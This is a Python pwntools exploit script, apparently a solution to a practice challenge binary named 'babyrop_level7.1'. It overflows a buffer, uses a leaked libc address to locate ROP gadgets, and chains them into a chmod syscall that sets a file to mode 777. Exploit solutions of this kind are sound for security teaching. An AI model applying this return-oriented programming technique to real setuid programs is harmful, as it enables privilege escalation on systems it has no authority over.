#!/usr/bin/env python3
from pwn import *

# INIT

# Set the architecture to amd64 for 64-bit binaries
context.arch = 'amd64'
# Set log level to CRITICAL to reduce output verbosity
# Load the ELF binary for analysis
elf = ELF('/challenge/babyrop_level7.1')

# CALCULATING BUFFER LENGTH
# Create a process to determine the length of the cyclic pattern needed to cause a crash
io = elf.process(setuid=False)
# Send a cyclic pattern of length 512 and wait for the process to crash
io.sendline(cyclic(512, n=8))
io.wait()

# Get the length of the cyclic pattern until the crash occurs
buff_len = int(cyclic_find(io.corefile.fault_addr, n=8))
print(buff_len)

# EXPLOITING
# Create a new process for the actual exploitation
io = elf.process()
# Receive the libc base address from the output
io.recvuntil(b'libc is: 0x')
system_addr = int(io.recvuntil(b'.').decode()[:-1], 16)


# Load the libc ELF for further analysis
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

# Calculate the offset of the 'system' function within libc
system_offset = libc.symbols['system']
# Set the base address of libc
libc.address = system_addr - system_offset

# Define relevant offsets in libc from ROPGadget
SYSCALL = libc.address + 0x02284d
POP_RAX = libc.address + 0x036174
POP_RDI = libc.address + 0x023b6a
POP_RSI = libc.address + 0x02601f

# Construct the payload to call chmod
# L'indirizzo della stringa main potevo anche trovarlo utilizzando ghidra chiaramente
PAYLOAD = b'A' * buff_len + \
    p64(POP_RDI) + \
    p64(next(elf.search(b'main\x00'))) + \
    p64(POP_RAX) + \
    p64(0x5A) + \
    p64(POP_RSI) + \
    p64(0o777) + \
    p64(SYSCALL)

# Send the payload to the process
io.sendline(PAYLOAD)
# Switch to interactive mode to flush stdout.
io.interactive()
